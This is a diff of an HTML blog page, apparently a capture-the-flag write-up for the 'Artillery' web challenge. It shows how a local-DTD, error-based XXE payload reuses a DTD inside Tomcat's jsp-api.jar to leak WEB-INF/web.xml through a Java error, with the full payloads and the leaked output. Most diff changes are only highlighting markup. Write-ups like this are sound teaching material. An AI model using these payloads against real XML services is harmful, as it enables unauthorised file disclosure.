@@ -7,7 +7,7 @@
 <meta name="description" content="Thalium blog." />
 <meta name="keywords" content="blog, tech" />
 <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
-<meta name="generator" content="Hugo 0.89.4" />
+<meta name="generator" content="Hugo 0.95.0" />
 
 <link rel="canonical" href="https://thalium.github.io/blog/posts/apocalypse2021-artillery/">
 <meta property="og:title" content="Cyber Apocalypse 2021 5/5 - Artillery" />
@@ -156,38 +156,38 @@ if (!doNotTrack) {
 <p>When you enter a query in the search bar, like &lsquo;<code>qwerty</code>&rsquo; and press enter, nothing happens.</p>
 <p>The website will make a <code>GET</code> request on <code>/airbase/?query=qwerty</code>, and nothing more. Which is weird&hellip;</p>
 <p>So, the next step is to have a look at the <code>airbase.js</code> JavaScript code:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">async</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">getResults</span>() {
-  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">query</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;query&#34;</span>).<span style="color:#a6e22e">value</span>;
-  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">xml</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`&lt;?xml version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;&lt;root&gt;&lt;query&gt;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">query</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&lt;/query&gt;&lt;/root&gt;`</span>;
-  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">response</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;/search&#39;</span>, {
-    <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;POST&#39;</span>,
-    <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> {
-      <span style="color:#e6db74">&#39;Content-Type&#39;</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;application/xml&#39;</span>
-    },
-    <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">xml</span>
-  });
-
-  [...]
-}
-</code></pre></div><blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">async</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">getResults</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">query</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;query&#34;</span>).<span style="color:#a6e22e">value</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">xml</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`&lt;?xml version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;&lt;root&gt;&lt;query&gt;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">query</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&lt;/query&gt;&lt;/root&gt;`</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">response</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;/search&#39;</span>, {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;POST&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#39;Content-Type&#39;</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;application/xml&#39;</span>
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">xml</span>
+</span></span><span style="display:flex;"><span>  });
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  [...]
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><blockquote>
 <p>We have a <code>getResults</code> function which makes an <code>XML</code> <code>POST</code> query on <code>/search</code>.</p>
 </blockquote>
 <p>Let&rsquo;s hit the search endpoint with a random query!</p>
-<p>Here is the corresponding <code>curl</code> command. Our query is &lsquo;<code>gun</code>':</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl <span style="color:#e6db74">&#39;http://&lt;IP&gt;:&lt;PORT&gt;/search&#39;</span> -H <span style="color:#e6db74">&#39;Content-Type: application/xml&#39;</span> -H <span style="color:#e6db74">&#39;Origin: http://&lt;IP&gt;:&lt;PORT&gt;&#39;</span> --data-raw <span style="color:#e6db74">&#39;&lt;?xml version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;&lt;root&gt;&lt;query&gt;gun&lt;/query&gt;&lt;/root&gt;&#39;</span>
-</code></pre></div><p>We have the following response:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">[{<span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;Gunstar&#34;</span>, <span style="color:#f92672">&#34;url&#34;</span>:<span style="color:#e6db74">&#34;gunstar.jpg&#34;</span>, <span style="color:#f92672">&#34;desc&#34;</span>:<span style="color:#e6db74">&#34;Capable of both short and long-range space flight, the Gunstar is a two-person craft. It is approximately 20 meters in length and carries a complement of two operators, a pilot and a gunner.&#34;</span>}, { <span style="color:#f92672">&#34;name&#34;</span> : <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#f92672">&#34;url&#34;</span> : <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#f92672">&#34;desc&#34;</span> : <span style="color:#e6db74">&#34;&#34;</span> }]
-</code></pre></div><p>Now, what ? Let&rsquo;s have a look at the server code which was given to us!</p>
+<p>Here is the corresponding <code>curl</code> command. Our query is &lsquo;<code>gun</code>&rsquo;:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl <span style="color:#e6db74">&#39;http://&lt;IP&gt;:&lt;PORT&gt;/search&#39;</span> -H <span style="color:#e6db74">&#39;Content-Type: application/xml&#39;</span> -H <span style="color:#e6db74">&#39;Origin: http://&lt;IP&gt;:&lt;PORT&gt;&#39;</span> --data-raw <span style="color:#e6db74">&#39;&lt;?xml version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;&lt;root&gt;&lt;query&gt;gun&lt;/query&gt;&lt;/root&gt;&#39;</span>
+</span></span></code></pre></div><p>We have the following response:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>[{<span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;Gunstar&#34;</span>, <span style="color:#f92672">&#34;url&#34;</span>:<span style="color:#e6db74">&#34;gunstar.jpg&#34;</span>, <span style="color:#f92672">&#34;desc&#34;</span>:<span style="color:#e6db74">&#34;Capable of both short and long-range space flight, the Gunstar is a two-person craft. It is approximately 20 meters in length and carries a complement of two operators, a pilot and a gunner.&#34;</span>}, { <span style="color:#f92672">&#34;name&#34;</span> : <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#f92672">&#34;url&#34;</span> : <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#f92672">&#34;desc&#34;</span> : <span style="color:#e6db74">&#34;&#34;</span> }]
+</span></span></code></pre></div><p>Now, what ? Let&rsquo;s have a look at the server code which was given to us!</p>
 <h1 id="server-setup">Server setup</h1>
 <p>We are given the server code with a <code>Dockerfile</code> to boot!</p>
 <p>Let&rsquo;s setup the environment on our side:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-docker" data-lang="docker"><span style="color:#75715e"># Build</span><span style="color:#960050;background-color:#1e0010">
-</span><span style="color:#960050;background-color:#1e0010"></span>docker build . -t web_artillery<span style="color:#960050;background-color:#1e0010">
-</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#75715e"># Run it</span><span style="color:#960050;background-color:#1e0010">
-</span><span style="color:#960050;background-color:#1e0010"></span>docker run -p 8080:8080 -name artilley web_artillery:latest<span style="color:#960050;background-color:#1e0010">
-</span></code></pre></div><p>We can go into the container and have a look around using:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-docker" data-lang="docker">docker exec -it artillery bash<span style="color:#960050;background-color:#1e0010">
-</span></code></pre></div><h1 id="analysis">Analysis</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-docker" data-lang="docker"><span style="display:flex;"><span><span style="color:#75715e"># Build</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>docker build . -t web_artillery<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#75715e"># Run it</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>docker run -p 8080:8080 -name artilley web_artillery:latest<span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>We can go into the container and have a look around using:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-docker" data-lang="docker"><span style="display:flex;"><span>docker exec -it artillery bash<span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><h1 id="analysis">Analysis</h1>
 <h2 id="where-will-the-flag-be">Where will the flag be?</h2>
 <p>The file <code>WEB-INF/web.xml</code> describes the routes served by the server:</p>
 <ul>
@@ -195,9 +195,9 @@ if (!doNotTrack) {
 <li>the other one is <code>/flag_hash</code>. Will we get the flag by hitting <code>/flag_hash</code>? No!</li>
 </ul>
 <p>In the <code>entrypoint.sh</code> file given, we have the following lines of code:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">hash<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>cat /dev/urandom | tr -dc <span style="color:#e6db74">&#39;a-zA-Z0-9&#39;</span> | fold -w <span style="color:#ae81ff">32</span> | head -n <span style="color:#ae81ff">1</span> | md5sum | cut -d <span style="color:#e6db74">&#39; &#39;</span> -f 1<span style="color:#66d9ef">)</span>
-sed -i <span style="color:#e6db74">&#34;s/hash/</span>$hash<span style="color:#e6db74">/g&#34;</span> /tomcat/webapps/ROOT/WEB-INF/web.xml
-</code></pre></div><p>The <code>/flag_hash</code> route will have its <code>hash</code> part generated at the server setup, and will become a <code>/flag_aZ09rand0m</code> route.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hash<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>cat /dev/urandom | tr -dc <span style="color:#e6db74">&#39;a-zA-Z0-9&#39;</span> | fold -w <span style="color:#ae81ff">32</span> | head -n <span style="color:#ae81ff">1</span> | md5sum | cut -d <span style="color:#e6db74">&#39; &#39;</span> -f 1<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>sed -i <span style="color:#e6db74">&#34;s/hash/</span>$hash<span style="color:#e6db74">/g&#34;</span> /tomcat/webapps/ROOT/WEB-INF/web.xml
+</span></span></code></pre></div><p>The <code>/flag_hash</code> route will have its <code>hash</code> part generated at the server setup, and will become a <code>/flag_aZ09rand0m</code> route.</p>
 <p>We also know, according to the file <code>WEB-INF/classes/Flag.java</code>, that we will get the flag by making a <code>GET</code> query to that generated endpoint.</p>
 <blockquote>
 <p>Therefore, if we can get the content of the <code>WEB-INF/web.xml</code> file, we will get the generated <code>flag</code> route, which will give us the flag through a <code>GET</code> request.</p>
@@ -205,33 +205,33 @@ sed -i <span style="color:#e6db74">&#34;s/hash/</span>$hash<span style="color:#e
 <h2 id="what-vulnerability-will-we-use">What vulnerability will we use?</h2>
 <p>We are sending XML to the server. What is the first thing that comes to mind? <code>XXE</code>, or <a href="https://portswigger.net/web-security/xxe"><em>XML external entity injection</em></a>!</p>
 <p>However, we are going to have a hard time because of those lines in <code>WEB-INF/classes/Results.java</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#75715e">// Make sekure!
-</span><span style="color:#75715e"></span>dbf<span style="color:#f92672">.</span><span style="color:#a6e22e">setXIncludeAware</span><span style="color:#f92672">(</span><span style="color:#66d9ef">false</span><span style="color:#f92672">);</span>
-dbf<span style="color:#f92672">.</span><span style="color:#a6e22e">setExpandEntityReferences</span><span style="color:#f92672">(</span><span style="color:#66d9ef">false</span><span style="color:#f92672">);</span>
-dbf<span style="color:#f92672">.</span><span style="color:#a6e22e">setFeature</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;http://xml.org/sax/features/external-general-entities&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">false</span><span style="color:#f92672">);</span>
-dbf<span style="color:#f92672">.</span><span style="color:#a6e22e">setFeature</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;http://xml.org/sax/features/external-parameter-entities&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">false</span><span style="color:#f92672">);</span>
-dbf<span style="color:#f92672">.</span><span style="color:#a6e22e">setFeature</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;http://apache.org/xml/features/nonvalidating/load-external-dtd&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">false</span><span style="color:#f92672">);</span>
-dbf<span style="color:#f92672">.</span><span style="color:#a6e22e">setFeature</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;http://apache.org/xml/features/disallow-doctype-decl&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
-dbf<span style="color:#f92672">.</span><span style="color:#a6e22e">setAttribute</span><span style="color:#f92672">(</span>XMLConstants<span style="color:#f92672">.</span><span style="color:#a6e22e">FEATURE_SECURE_PROCESSING</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
-</code></pre></div><p>This line:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">dbf<span style="color:#f92672">.</span><span style="color:#a6e22e">setFeature</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;http://apache.org/xml/features/disallow-doctype-decl&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
-</code></pre></div><p>Will throw a fatal error if you use a <code>DOCTYPE</code> declaration in your XML.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// Make sekure!
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>dbf<span style="color:#f92672">.</span><span style="color:#a6e22e">setXIncludeAware</span><span style="color:#f92672">(</span><span style="color:#66d9ef">false</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>dbf<span style="color:#f92672">.</span><span style="color:#a6e22e">setExpandEntityReferences</span><span style="color:#f92672">(</span><span style="color:#66d9ef">false</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>dbf<span style="color:#f92672">.</span><span style="color:#a6e22e">setFeature</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;http://xml.org/sax/features/external-general-entities&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">false</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>dbf<span style="color:#f92672">.</span><span style="color:#a6e22e">setFeature</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;http://xml.org/sax/features/external-parameter-entities&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">false</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>dbf<span style="color:#f92672">.</span><span style="color:#a6e22e">setFeature</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;http://apache.org/xml/features/nonvalidating/load-external-dtd&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">false</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>dbf<span style="color:#f92672">.</span><span style="color:#a6e22e">setFeature</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;http://apache.org/xml/features/disallow-doctype-decl&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>dbf<span style="color:#f92672">.</span><span style="color:#a6e22e">setAttribute</span><span style="color:#f92672">(</span>XMLConstants<span style="color:#f92672">.</span><span style="color:#a6e22e">FEATURE_SECURE_PROCESSING</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
+</span></span></code></pre></div><p>This line:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>dbf<span style="color:#f92672">.</span><span style="color:#a6e22e">setFeature</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;http://apache.org/xml/features/disallow-doctype-decl&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
+</span></span></code></pre></div><p>Will throw a fatal error if you use a <code>DOCTYPE</code> declaration in your XML.</p>
 <p>And this one:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">dbf<span style="color:#f92672">.</span><span style="color:#a6e22e">setFeature</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;http://apache.org/xml/features/nonvalidating/load-external-dtd&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">false</span><span style="color:#f92672">);</span>
-</code></pre></div><p>Will not let you load <code>external DTDs</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>dbf<span style="color:#f92672">.</span><span style="color:#a6e22e">setFeature</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;http://apache.org/xml/features/nonvalidating/load-external-dtd&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">false</span><span style="color:#f92672">);</span>
+</span></span></code></pre></div><p>Will not let you load <code>external DTDs</code>.</p>
 <h1 id="xxe">XXE</h1>
 <h2 id="focusing-on-local-dtd-files">Focusing on <code>local DTD</code> files</h2>
 <p>Having tried some XXE payloads without success, I had another look at the given <code>Dockerfile</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-docker" data-lang="docker"><span style="color:#66d9ef">RUN</span> find / -name <span style="color:#e6db74">&#34;*.dtd&#34;</span> -type f -delete<span style="color:#960050;background-color:#1e0010">
-</span></code></pre></div><p>The above line, which removes all <code>.dtd</code> files from the system, meant I was going to have a hard look at <strong><code>local DTD</code> XXE</strong>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-docker" data-lang="docker"><span style="display:flex;"><span><span style="color:#66d9ef">RUN</span> find / -name <span style="color:#e6db74">&#34;*.dtd&#34;</span> -type f -delete<span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>The above line, which removes all <code>.dtd</code> files from the system, meant I was going to have a hard look at <strong><code>local DTD</code> XXE</strong>.</p>
 <p>By looking at the options using <code>local DTD</code> files in <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#xxe-with-local-dtd">PayloadsAllTheThings</a>, I tried the first payload:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-dtd" data-lang="dtd"><span style="color:#66d9ef">&lt;!DOCTYPE</span> <span style="color:#f92672">root</span> <span style="color:#66d9ef">[</span>
-    <span style="color:#66d9ef">&lt;!ENTITY</span> % local_dtd <span style="color:#66d9ef">SYSTEM</span> <span style="color:#e6db74">&#34;file:///abcxyz/&#34;</span><span style="color:#66d9ef">&gt;</span>
-
-    %local_dtd;
-<span style="color:#66d9ef">]&gt;</span>
-<span style="color:#960050;background-color:#1e0010">&lt;root</span><span style="color:#66d9ef">&gt;</span><span style="color:#960050;background-color:#1e0010">&lt;/root</span><span style="color:#66d9ef">&gt;</span>
-</code></pre></div><p>And we actually get an answer!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-dtd" data-lang="dtd"><span style="display:flex;"><span><span style="color:#66d9ef">&lt;!DOCTYPE</span> <span style="color:#f92672">root</span> <span style="color:#66d9ef">[</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">&lt;!ENTITY</span> % local_dtd <span style="color:#66d9ef">SYSTEM</span> <span style="color:#e6db74">&#34;file:///abcxyz/&#34;</span><span style="color:#66d9ef">&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    %local_dtd;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">]&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;root</span><span style="color:#66d9ef">&gt;</span><span style="color:#960050;background-color:#1e0010">&lt;/root</span><span style="color:#66d9ef">&gt;</span>
+</span></span></code></pre></div><p>And we actually get an answer!</p>
 <pre tabindex="0"><code>java.io.FileNotFoundException: /abcxyz (No such file or directory)
 	at java.io.FileInputStream.open0(Native Method)
 	at java.io.FileInputStream.open(FileInputStream.java:195)
@@ -246,70 +246,70 @@ dbf<span style="color:#f92672">.</span><span style="color:#a6e22e">setAttribute<
 <p>But what about <code>.jar</code> files containing dtd files?</p>
 <p>If we <code>docker exec -it artillery bash</code>, we can even look for them, they are in <code>/tomcat/lib</code>.</p>
 <p>For example the file <code>/tomcat/lib/jsp-api.jar</code> exists. We can adapt one XXE payload given <a href="https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md">here</a>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-dtd" data-lang="dtd"><span style="color:#66d9ef">&lt;!DOCTYPE</span> <span style="color:#f92672">message</span> <span style="color:#66d9ef">[</span>
-    <span style="color:#66d9ef">&lt;!ENTITY</span> % local_dtd <span style="color:#66d9ef">SYSTEM</span> <span style="color:#e6db74">&#34;file:///usr/local/tomcat/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd&#34;</span><span style="color:#66d9ef">&gt;</span>
-
-    <span style="color:#66d9ef">&lt;!ENTITY</span> % URI <span style="color:#e6db74">&#39;(aa) #IMPLIED&gt;
-</span><span style="color:#e6db74">        &lt;!ENTITY &amp;#x25; file SYSTEM &#34;file:///YOUR_FILE&#34;&gt;
-</span><span style="color:#e6db74">        &lt;!ENTITY &amp;#x25; eval &#34;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///abcxyz/&amp;#x25;file;&amp;#x27;&gt;&#34;&gt;
-</span><span style="color:#e6db74">        &amp;#x25;eval;
-</span><span style="color:#e6db74">        &amp;#x25;error;
-</span><span style="color:#e6db74">        &lt;!ATTLIST attxx aa &#34;bb&#34;&#39;</span><span style="color:#66d9ef">&gt;</span>
-
-    %local_dtd;
-<span style="color:#66d9ef">]&gt;</span>
-<span style="color:#960050;background-color:#1e0010">&lt;message</span><span style="color:#66d9ef">&gt;</span><span style="color:#960050;background-color:#1e0010">&lt;/message</span><span style="color:#66d9ef">&gt;</span>
-</code></pre></div><p>To our target system:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-dtd" data-lang="dtd"><span style="color:#66d9ef">&lt;!DOCTYPE</span> <span style="color:#f92672">message</span> <span style="color:#66d9ef">[</span>
-    <span style="color:#75715e">&lt;!--
-</span><span style="color:#75715e">    Our jsp-api.jar is located in /tomcat/lib.
-</span><span style="color:#75715e">    I did not find the /javax path in jsp-api.jar
-</span><span style="color:#75715e">    But thankfully, the jspxml.dtd was in the /jakarta path
-</span><span style="color:#75715e">    --&gt;</span>
-    <span style="color:#66d9ef">&lt;!ENTITY</span> % local_dtd <span style="color:#66d9ef">SYSTEM</span> <span style="color:#e6db74">&#34;jar:file:/tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd&#34;</span><span style="color:#66d9ef">&gt;</span>
-
-    <span style="color:#75715e">&lt;!-- By targeting the WEB-INF/web.xml file, we will have the generated flag route
-</span><span style="color:#75715e">    In the returned Java error returned by the server.
-</span><span style="color:#75715e">    --&gt;</span>
-    <span style="color:#66d9ef">&lt;!ENTITY</span> % URI <span style="color:#e6db74">&#39;(aa) #IMPLIED&gt;
-</span><span style="color:#e6db74">        &lt;!ENTITY &amp;#x25; file SYSTEM &#34;file:////tomcat/webapps/ROOT/WEB-INF/web.xml&#34;&gt;
-</span><span style="color:#e6db74">        &lt;!ENTITY &amp;#x25; eval &#34;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///abcxyz/&amp;#x25;file;&amp;#x27;&gt;&#34;&gt;
-</span><span style="color:#e6db74">        &amp;#x25;eval;
-</span><span style="color:#e6db74">        &amp;#x25;error;
-</span><span style="color:#e6db74">        &lt;!ATTLIST attxx aa &#34;bb&#34;&#39;</span><span style="color:#66d9ef">&gt;</span>
-
-    %local_dtd;
-<span style="color:#66d9ef">]&gt;</span>
-<span style="color:#960050;background-color:#1e0010">&lt;message</span><span style="color:#66d9ef">&gt;</span><span style="color:#960050;background-color:#1e0010">&lt;/message</span><span style="color:#66d9ef">&gt;</span>
-</code></pre></div><p>And, it works! We have the following error message response:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml">java.io.FileNotFoundException: /abcxyz/<span style="color:#f92672">&lt;web-app</span> <span style="color:#a6e22e">version=</span><span style="color:#e6db74">&#34;3.0&#34;</span>
-  <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;http:/java.sun.com/xml/ns/javaee&#34;</span>
-  <span style="color:#a6e22e">xmlns:xsi=</span><span style="color:#e6db74">&#34;http:/www.w3.org/2001/XMLSchema-instance&#34;</span>
-  <span style="color:#a6e22e">xsi:schemaLocation=</span><span style="color:#e6db74">&#34;http:/java.sun.com/xml/ns/javaee http:/java.sun.com/xml/ns/javaee/web-app_3_0.xsd&#34;</span><span style="color:#f92672">&gt;</span>
-
-   <span style="color:#f92672">&lt;servlet&gt;</span>
-      <span style="color:#f92672">&lt;servlet-name&gt;</span>Results<span style="color:#f92672">&lt;/servlet-name&gt;</span>
-      <span style="color:#f92672">&lt;servlet-class&gt;</span>Results<span style="color:#f92672">&lt;/servlet-class&gt;</span>
-   <span style="color:#f92672">&lt;/servlet&gt;</span>
-
-   <span style="color:#f92672">&lt;servlet-mapping&gt;</span>
-      <span style="color:#f92672">&lt;servlet-name&gt;</span>Results<span style="color:#f92672">&lt;/servlet-name&gt;</span>
-      <span style="color:#f92672">&lt;url-pattern&gt;</span>/search<span style="color:#f92672">&lt;/url-pattern&gt;</span>
-   <span style="color:#f92672">&lt;/servlet-mapping&gt;</span>
-
-   <span style="color:#f92672">&lt;servlet&gt;</span>
-      <span style="color:#f92672">&lt;servlet-name&gt;</span>Flag<span style="color:#f92672">&lt;/servlet-name&gt;</span>
-      <span style="color:#f92672">&lt;servlet-class&gt;</span>Flag<span style="color:#f92672">&lt;/servlet-class&gt;</span>
-   <span style="color:#f92672">&lt;/servlet&gt;</span>
-
-   <span style="color:#f92672">&lt;servlet-mapping&gt;</span>
